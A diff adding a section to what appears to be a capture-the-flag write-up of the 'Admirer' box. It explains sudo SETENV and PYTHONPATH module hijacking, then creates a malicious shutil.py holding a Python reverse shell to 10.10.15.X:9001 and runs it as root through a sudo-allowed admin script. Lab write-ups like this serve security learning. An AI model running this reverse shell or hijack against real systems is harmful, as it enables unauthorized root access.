@@ -614,3 +614,215 @@ One crucial thing that I don’t see very often is the “SETENV” tag. To chec
 >
 > If the command matched is `ALL`, the SETENV tag is implied for that command;
 > this default may be overridden by use of the NOSETENV tag.
+
+env_reset is also mentioned when running sudo -l, checking on the man page:
+
+> If enabled, sudo will set the `HOME` environment variable to the home
+> directory of the target user (which is root unless the `-u` option is used).
+> This effectively means that the `-H` option is always implied.
+>
+> Note that `HOME` is already set when the `env_reset` option is enabled, so
+> `always_set_home` is only effective for configurations where either
+> `env_reset` is disabled or `HOME` is present in the `env_keep` list.
+>
+> This flag is off by default.
+
+And we also have a secure_path set:
+
+> Path used for every command run from sudo. If you don't trust the people
+> running sudo to have a sane `PATH` environment variable you may want to use
+> this.
+>
+> Another use is if you want to have the “root path” be separate from the
+> “user path”. Users in the group specified by the `exempt_group` option are
+> not affected by `secure_path`.
+>
+> This option is not set by default.
+
+Translating this block of words, what we have in sudo is a combination of different configurations: When we run sudo, the secure_path set is going to be used, but waldo is allowed to override that and inject his own environment variables (except $PATH).
+So, how can we abuse this? We now have to check the contents, privileges and permissions:
+
+```bash
+#!/bin/bash
+
+view_uptime()
+{
+    /usr/bin/uptime -p
+}
+
+view_users()
+{
+    /usr/bin/w
+}
+
+view_crontab()
+{
+    /usr/bin/crontab -l
+}
+
+backup_passwd()
+{
+    if [ "$EUID" -eq 0 ]
+    then
+        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
+        /bin/cp /etc/passwd /var/backups/passwd.bak
+        /bin/chown root:root /var/backups/passwd.bak
+        /bin/chmod 600 /var/backups/passwd.bak
+        echo "Done."
+    else
+        echo "Insufficient privileges to perform the selected operation."
+    fi
+}
+
+backup_shadow()
+{
+    if [ "$EUID" -eq 0 ]
+    then
+        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
+        /bin/cp /etc/shadow /var/backups/shadow.bak
+        /bin/chown root:shadow /var/backups/shadow.bak
+        /bin/chmod 600 /var/backups/shadow.bak
+        echo "Done."
+    else
+        echo "Insufficient privileges to perform the selected operation."
+    fi
+}
+
+backup_web()
+{
+    if [ "$EUID" -eq 0 ]
+    then
+        echo "Running backup script in the background, it might take a while..."
+        /opt/scripts/backup.py &
+    else
+        echo "Insufficient privileges to perform the selected operation."
+    fi
+}
+
+backup_db()
+{
+    if [ "$EUID" -eq 0 ]
+    then
+        echo "Running mysqldump in the background, it may take a while..."
+        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
+    else
+        echo "Insufficient privileges to perform the selected operation."
+    fi
+}
+
+# Non-interactive way, to be used by the web interface
+if [ $# -eq 1 ]
+then
+    option=$1
+    case $option in
+        1) view_uptime ;;
+        2) view_users ;;
+        3) view_crontab ;;
+        4) backup_passwd ;;
+        5) backup_shadow ;;
+        6) backup_web ;;
+        7) backup_db ;;
+        *) echo "Unknown option." >&2
+    esac
+
+    exit 0
+fi
+
+# Interactive way, to be called from the command line
+options=("View system uptime"
+         "View logged in users"
+         "View crontab"
+         "Backup passwd file"
+         "Backup shadow file"
+         "Backup web data"
+         "Backup DB"
+         "Quit")
+
+echo
+echo "[[[ System Administration Menu ]]]"
+PS3="Choose an option: "
+COLUMNS=11
+select opt in "${options[@]}"; do
+    case $REPLY in
+        1) view_uptime ; break ;;
+        2) view_users ; break ;;
+        3) view_crontab ; break ;;
+        4) backup_passwd ; break ;;
+        5) backup_shadow ; break ;;
+        6) backup_web ; break ;;
+        7) backup_db ; break ;;
+        8) echo "Bye!" ; break ;;
+        *) echo "Unknown option." >&2
+    esac
+done
+
+exit 0
+```
+```bash
+waldo@admirer:~$ ls -la /opt/scripts/admin_tasks.sh
+-rwxr-xr-x 1 root admins 2613 Dec  2  2019 /opt/scripts/admin_tasks.sh
+```
+
+We can now make backups of shadow and passwd files, however, the permissions of these will make them unreachable with our current user, as the command run after using these options is chmod 600 (root can read this files but nobody else can). There is a particular function that gets my attention:
+
+```bash
+backup_web()
+{
+    if [ "$EUID" -eq 0 ]
+    then
+        echo "Running backup script in the background, it might take a while..."
+        /opt/scripts/backup.py &
+    else
+        echo "Insufficient privileges to perform the selected operation."
+    fi
+}
+```
+The option 6, backup web, executes a third python script as root. I’ll check backup.py now:
+
+```python
+#!/usr/bin/python3
+
+from shutil import make_archive
+
+src = '/var/www/html/'
+
+# old ftp directory, not used anymore
+# dst = '/srv/ftp/html'
+
+dst = '/var/backups/html'
+
+make_archive(dst, 'gztar', src)
+```
+
+Nothing in plaintext, but, we know this script is importing the shutil module. Following [this post](https://leemendelowitz.github.io/blog/how-does-python-find-packages.html), plus our current configuration when running sudo, we have a clear attack path.
+
+The post states that when running a python script in linux, it’s modules are being searched by linux with the PYTHONPATH environment variable. We can set a new PYTHONPATH environment with a malicious shutil.py, as it will be run as root.
+
+First, we create a shutil.py with a python reverse shell inside of it:
+
+```bash
+waldo@admirer:/var/tmp$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.X",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")' > shutil.py
+```
+
+And now we run as sudo the option on the admin_tasks.sh, setting the PYTHONPATH before:
+
+```bash
+waldo@admirer:/var/tmp$ sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 6
+Running backup script in the background, it might take a while...
+```
+Checking our listener:
+
+<p align="center">
+  <img src="/assets/images/admirer/Captura39.PNG" width="700">
+</p>
